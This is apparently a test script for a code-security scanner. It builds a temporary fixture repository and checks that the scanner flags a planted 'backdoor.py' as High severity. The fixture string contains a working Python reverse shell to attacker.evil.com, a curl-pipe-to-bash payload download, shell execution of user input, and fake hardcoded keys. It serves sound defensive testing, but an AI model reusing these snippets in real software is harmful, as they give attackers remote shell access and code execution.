"""
Phase 2 validation — Codebreaker scan via POST /codebreaker/scan.

Usage:
    python tests/validate_p2.py

Requires GEMINI_API_KEY (and optionally GROQ_API_KEY) in .env at project root.
Creates a temporary fixture repo, scans it, and asserts High-severity detection.
"""

from __future__ import annotations

import json
import os
import shutil
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

try:
    from dotenv import load_dotenv

    load_dotenv(ROOT / ".env")
except ImportError:
    pass

CLEAN_FILE = '''"""Benign utility module."""

def add(a: int, b: int) -> int:
    """Return the sum of two integers."""
    return a + b
'''

MALICIOUS_FILE = '''"""Simulated compromised module — fixture only."""
import os
import socket
import subprocess

API_KEY = "sk-live-hardcoded-secret-abc123xyz"
AWS_SECRET = "AKIAFAKEKEY00000000000"

def run_payload():
    os.system("curl http://evil.example.com/payload.sh | bash")
    user_cmd = input("cmd> ")
    subprocess.run(user_cmd, shell=True)

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("attacker.evil.com", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
'''


def _create_fixture_repo(base: Path) -> Path:
    repo = base / "fixture_repo"
    repo.mkdir(parents=True, exist_ok=True)
    (repo / "utils.py").write_text(CLEAN_FILE, encoding="utf-8")
    (repo / "backdoor.py").write_text(MALICIOUS_FILE, encoding="utf-8")
    return repo


def validate() -> None:
    from fastapi.testclient import TestClient

    from backend.main import app

    if not os.getenv("GEMINI_API_KEY"):
        print("[FAIL] GEMINI_API_KEY is required for Codebreaker scans.", file=sys.stderr)
        sys.exit(1)

    client = TestClient(app)

    # 404 guardrail
    missing = client.post("/codebreaker/scan", json={"repo_path": "/nonexistent/path/xyz"})
    if missing.status_code != 404:
        print(
            f"[FAIL] Expected 404 for missing path, got {missing.status_code}",
            file=sys.stderr,
        )
        sys.exit(1)
    print("[OK] Missing repo_path returns 404")

    tmp = Path(tempfile.mkdtemp(prefix="codesentinel_p2_"))
    try:
        repo = _create_fixture_repo(tmp)
        print(f"[INFO] Fixture repo: {repo}")

        response = client.post("/codebreaker/scan", json={"repo_path": str(repo)})
        if response.status_code != 200:
            print(
                f"[FAIL] Scan returned {response.status_code}: {response.text}",
                file=sys.stderr,
            )
            sys.exit(1)

        data = response.json()
        findings = data.get("findings", [])
        print(f"[INFO] Files scanned: {data.get('files_scanned')}")
        print(f"[INFO] Findings count: {len(findings)}")
        print(f"[INFO] Scan saved: {data.get('scan_file')}")

        if findings:
            print("[INFO] Sample findings:")
            for f in findings[:5]:
                print(
                    f"  - [{f.get('severity')}] {f.get('file_path')}: "
                    f"{f.get('vulnerability_type')}"
                )

        high_on_backdoor = any(
            f.get("severity", "").lower() == "high"
            and "backdoor" in f.get("file_path", "").lower()
            for f in findings
        )
        high_malicious_type = any(
            f.get("severity", "").lower() == "high"
            and (
                "backdoor" in f.get("file_path", "").lower()
                or "command" in f.get("vulnerability_type", "").lower()
                or "credential" in f.get("vulnerability_type", "").lower()
                or "hardcoded" in f.get("vulnerability_type", "").lower()
            )
            for f in findings
        )

        if not high_malicious_type:
            print(
                "[FAIL] No High-severity finding on malicious fixture "
                "(backdoor.py). Full response:",
                file=sys.stderr,
            )
            print(json.dumps(data, indent=2), file=sys.stderr)
            sys.exit(1)

        print("[OK] High-severity malicious snippet detected")
        print("CodeSentinel Phase 2 Ready")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    validate()
